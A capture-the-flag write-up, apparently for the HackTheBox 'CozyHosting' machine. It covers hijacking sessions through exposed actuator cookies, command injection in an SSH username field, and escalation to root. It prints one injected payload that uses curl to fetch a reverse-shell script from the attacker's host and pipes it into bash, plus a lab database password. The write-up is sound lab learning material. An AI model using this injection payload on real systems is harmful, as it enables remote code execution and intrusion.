## Nmap:

## Shell access

Add the `cozyhosting.htb` domain to the hosts file.

### Enumerating port 80
Default/standard credentials don't seem to work on the login page.

Directory busting using Dirsearch:

The `/actuator/sessions` seems interesting, visiting it results in a bunch of cookies being exposed, these could be used to try and login to the application if they are still valid.

The first cookie that belongs to the kanderson user was used to authenticate.

On the admin page we get a hint about SSH keys, the payload can be inspected in Burp.

After trying out a few things I found out that leaving the username blank returned some sort of man page. This means we could possibly get RCE.

Since we arent allowed to use whitespaces in the username section weâ€™ll have to be creative with the payload:
```bash
# payload: 
host=127.0.0.1&username=";$(curl${IFS}10.10.14.153:8000/payload.sh|bash)"
```
![Pasted image 20240715100727.png](/images/Pasted image 20240715100727.png){: .normal }


On our machine we created a reverse shell bash script that we execute using curl.
![Pasted image 20240715100718.png](/images/Pasted image 20240715100718.png){: .normal width="450" }


The script can be accessed because we are running a Python server in the directory of the script.

Shell as the app user:

## Lateral movement
Transfer the jar file that is located in the app directory:
![Pasted image 20240715100701.png](/images/Pasted image 20240715100701.png){: .normal }
![Pasted image 20240715100657.png](/images/Pasted image 20240715100657.png){: .normal width="250" }

In the jar file credentials were identified: `postgres:Vg&nvzAQ7XxR`.
![Pasted image 20240715100650.png](/images/Pasted image 20240715100650.png){: .normal }

The previous credentials were used to authenticate to the postgres database. Inside of this database, we find the following credentials:
![Pasted image 20240715100646.png](/images/Pasted image 20240715100646.png){: .normal }

The admin password hash can be cracked using JohnTheRipper.
![Pasted image 20240715100641.png](/images/Pasted image 20240715100641.png){: .normal }

In `/etc/passwd` we can only find the Josh user.
![Pasted image 20240715100637.png](/images/Pasted image 20240715100637.png){: .normal }


SSH as the Josh user:

GTFObins can be used to elevate to root using SSH:
